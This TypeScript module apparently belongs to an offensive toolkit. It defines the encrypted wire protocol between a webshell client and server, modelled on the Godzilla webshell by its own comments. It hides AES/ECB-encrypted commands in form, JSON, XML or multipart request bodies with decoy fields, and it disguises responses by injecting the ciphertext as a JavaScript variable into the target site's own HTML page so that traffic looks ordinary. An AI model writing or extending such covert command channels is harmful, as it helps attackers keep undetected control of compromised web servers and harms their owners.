/**
 * Wire format shared by the mimic protocol's client (mimic.ts) and the mock
 * server (mimic-server.ts) — both sides must derive byte-identical values.
 *
 * The design borrows from Godzilla-ekp (see scratch/ekp analysis):
 *   - request:  POST form body `pass=<urlencode(base64(AES/ECB(data)))>`
 *   - response: a full HTML page with the ciphertext embedded in a JS
 *               assignment `var Re<md5(pass+key)[0:5]>_config="<base64>";`
 *               so the delimiters differ per shell and the page validates
 *               as ordinary HTML/JS.
 *   - crypto:   AES/ECB/PKCS5Padding, key = md5(secretKey)[0:16] — same
 *               derivation as Godzilla.
 *
 * What mimic adds on top: the HTML page is not hand-written — it is the
 * target site's own page, learned by `memparty profile` (site-profile.ts).
 *
 * The crypto/encoding/marker layer is selectable per profile — see
 * mimic-codecs.ts. This module keeps the original helpers (legacy defaults)
 * so pre-codec filters and tests keep working unchanged.
 */
import { md5Hex, md5Key16 } from "./crypto.js";
import {
  LEGACY_CIPHER,
  decryptField as codecDecryptField,
  encryptField as codecEncryptField,
  type MimicCipher,
} from "./mimic-codecs.js";
import { randomBytes, randomInt, randomUUID } from "node:crypto";

/** AES key derivation, identical on both sides. */
export function deriveAesKey(secretKey: string): string {
  return md5Key16(secretKey);
}

/**
 * Render placeholders in a decoy field value:
 *   {{hex:N}}      N hex chars        {{b64:N}}   N base64url chars
 *   {{uuid}}       a fresh UUID       {{ts}}      current unix seconds
 *   {{int:A:B}}    random integer in [A, B]
 */
export function renderFieldValue(value: string): string {
  return value
    .replaceAll(/\{\{hex:(\d+)\}\}/g, (_m, n) =>
      randomBytes(Math.ceil(Number(n) / 2))
        .toString("hex")
        .slice(0, Number(n)),
    )
    .replaceAll(/\{\{b64:(\d+)\}\}/g, (_m, n) =>
      randomBytes(Math.ceil((Number(n) * 3) / 4))
        .toString("base64url")
        .slice(0, Number(n)),
    )
    .replaceAll(/\{\{uuid\}\}/g, () => randomUUID())
    .replaceAll(/\{\{ts\}\}/g, () => String(Math.floor(Date.now() / 1000)))
    .replaceAll(/\{\{int:(\d+):(\d+)\}\}/g, (_m, a, b) =>
      String(randomInt(Number(a), Number(b) + 1)),
    );
}

/**
 * Left delimiter of the response ciphertext: `var Re<a1b2c>_config="`.
 * Derived from md5(pass+key)[0:5], so every shell gets unique markers.
 */
export function deriveLeftMarker(pass: string, secretKey: string): string {
  return `var Re${md5Hex(pass + secretKey).slice(0, 5)}_config="`;
}

/** Right delimiter of the response ciphertext (legacy js-var marker). */
export const RIGHT_MARKER = '";';

/** Encrypt + encode one request/response field. */
export function encryptField(
  plaintext: Buffer,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): string {
  return codecEncryptField(plaintext, aesKey, cipher);
}

/** Decode + decrypt one field. Throws on garbage. */
export function decryptField(
  value: string,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): Buffer {
  return codecDecryptField(value, aesKey, cipher);
}

/** Assemble a form-urlencoded body (values already raw; encoding happens here). */
export function buildFormBody(fields: Array<{ name: string; value: string }>): Buffer {
  return Buffer.from(
    fields.map((f) => `${f.name}=${encodeURIComponent(f.value)}`).join("&"),
    "utf8",
  );
}

/** Assemble a JSON object body (values already raw; stringified here). */
export function buildJsonBody(fields: Array<{ name: string; value: string }>): Buffer {
  const obj: Record<string, string> = {};
  for (const f of fields) obj[f.name] = f.value;
  return Buffer.from(JSON.stringify(obj), "utf8");
}

/**
 * Client side: render a profile bodyTemplate — the ciphertext goes where
 * `{{payload}}` sits, decoy macros ({{hex:N}} etc.) are rendered too.
 * Any text format: chat-API JSON, GraphQL, XML, multipart (the boundary is
 * just literal text in the template, mirrored in the Content-Type header).
 */
export function renderBodyTemplate(template: string, payload: string): Buffer {
  return Buffer.from(renderFieldValue(template.replaceAll("{{payload}}", payload)), "utf8");
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Server side: extract and decrypt the command from a JSON body.
 * Cipher values never contain quotes/escapes, so a plain field match is
 * enough — no full JSON parser needed. Null when the field isn't ours.
 */
export function decodeJsonBody(
  body: Buffer,
  pass: string,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): Buffer | null {
  const text = body.toString("utf8");
  const m = new RegExp(`"${escapeRegExp(pass)}"\\s*:\\s*"([^"]*)"`).exec(text);
  if (!m) return null;
  try {
    return decryptField(m[1]!, aesKey, cipher);
  } catch {
    return null;
  }
}

/**
 * Server side: extract and decrypt from a multipart/form-data body —
 * the value follows the part headers of the `name="field"` part.
 */
export function decodeMultipartBody(
  body: Buffer,
  pass: string,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): Buffer | null {
  const text = body.toString("utf8");
  const m = new RegExp(`name="${escapeRegExp(pass)}"[^\\n]*\\r?\\n(\\r?\\n|[^\\n]*\\r?\\n)*\\r?\\n([^\\r\\n]*)`).exec(text);
  if (!m) return null;
  try {
    return decryptField(m[2]!, aesKey, cipher);
  } catch {
    return null;
  }
}

/** Server side: extract and decrypt from an XML body — `<field>value</field>`. */
export function decodeXmlBody(
  body: Buffer,
  pass: string,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): Buffer | null {
  const text = body.toString("utf8");
  const m = new RegExp(`<${escapeRegExp(pass)}>([^<]*)</${escapeRegExp(pass)}>`).exec(text);
  if (!m) return null;
  try {
    return decryptField(m[1]!, aesKey, cipher);
  } catch {
    return null;
  }
}

/**
 * Server side: one probe over a raw body of unknown shape — tries every
 * anchor style (JSON field, multipart part, XML tag). The Java filter twins
 * this with jsonField/multipartField/xmlField.
 */
export function decodeAnyBody(
  body: Buffer,
  pass: string,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): Buffer | null {
  return (
    decodeJsonBody(body, pass, aesKey, cipher) ??
    decodeMultipartBody(body, pass, aesKey, cipher) ??
    decodeXmlBody(body, pass, aesKey, cipher)
  );
}

/** Client side: build the POST form body carrying `plaintext`. */
export function encodeRequestBody(
  pass: string,
  plaintext: Buffer,
  aesKey: string,
  decoys: Array<{ name: string; value: string }> = [],
  cipher: MimicCipher = LEGACY_CIPHER,
): Buffer {
  const fields = decoys.map((f) => ({ name: f.name, value: renderFieldValue(f.value) }));
  fields.push({ name: pass, value: encryptField(plaintext, aesKey, cipher) });
  return buildFormBody(fields);
}

/**
 * Server side: extract and decrypt the command from a form body.
 * Returns null when the body does not carry the pass parameter (i.e. the
 * request is an ordinary browser POST, not a shell request).
 */
export function decodeRequestBody(
  body: Buffer,
  pass: string,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): Buffer | null {
  const text = body.toString("utf8");
  for (const pair of text.split("&")) {
    const eq = pair.indexOf("=");
    if (eq <= 0) continue;
    if (pair.slice(0, eq) !== pass) continue;
    const value = decodeURIComponent(pair.slice(eq + 1));
    try {
      return decryptField(value, aesKey, cipher);
    } catch {
      return null;
    }
  }
  return null;
}

/**
 * Inject a ready-made fragment (marker + ciphertext) into the HTML
 * template — right before `</body>` when present, else appended.
 */
export function injectFragment(templateHtml: string, fragment: string): string {
  const idx = templateHtml.toLowerCase().lastIndexOf("</body>");
  if (idx === -1) return templateHtml + fragment;
  return templateHtml.slice(0, idx) + fragment + templateHtml.slice(idx);
}

/**
 * Server side: wrap `b64Cipher` in the JS assignment and inject it into the
 * HTML template — right before `</body>` when present, else appended.
 */
export function injectIntoTemplate(
  templateHtml: string,
  b64Cipher: string,
  leftMarker: string,
): string {
  return injectFragment(templateHtml, `<script>${leftMarker}${b64Cipher}${RIGHT_MARKER}</script>`);
}

/** Client side: pull the ciphertext back out of the HTML page. */
export function extractFromHtml(
  html: string,
  leftMarker: string,
  rightMarker: string = RIGHT_MARKER,
): string | null {
  return extractBetween(html, leftMarker, rightMarker);
}

/** Extract the value between two literal bounds (empty right = to end of text). */
export function extractBetween(text: string, left: string, right: string): string | null {
  const start = text.indexOf(left);
  if (start === -1) return null;
  const valueStart = start + left.length;
  if (right === "") return text.slice(valueStart);
  const end = text.indexOf(right, valueStart);
  if (end === -1) return null;
  return text.slice(valueStart, end);
}

export interface PayloadDelimiters {
  left: string;
  right: string;
}

/**
 * One extraction candidate per cover template. A template carrying
 * {{payload}} yields its exact left/right context (any text format — the
 * cipher alphabet never contains JSON/HTML delimiters); templates without a
 * placeholder share the marker pair (their fragment is marker-injected).
 * The client tries each candidate until one matches, so template rotation
 * on the server side never breaks extraction.
 */
export function templateDelimiters(
  templates: Array<{ template: string }>,
  markers: { left: string; right: string },
): PayloadDelimiters[] {
  const out: PayloadDelimiters[] = [];
  let markerUsed = false;
  for (const t of templates) {
    const idx = t.template.indexOf("{{payload}}");
    if (idx !== -1) {
      out.push({
        left: t.template.slice(0, idx),
        right: t.template.slice(idx + "{{payload}}".length),
      });
    } else if (!markerUsed) {
      out.push({ left: markers.left, right: markers.right });
      markerUsed = true;
    }
  }
  if (out.length === 0) out.push({ left: markers.left, right: markers.right });
  return out;
}
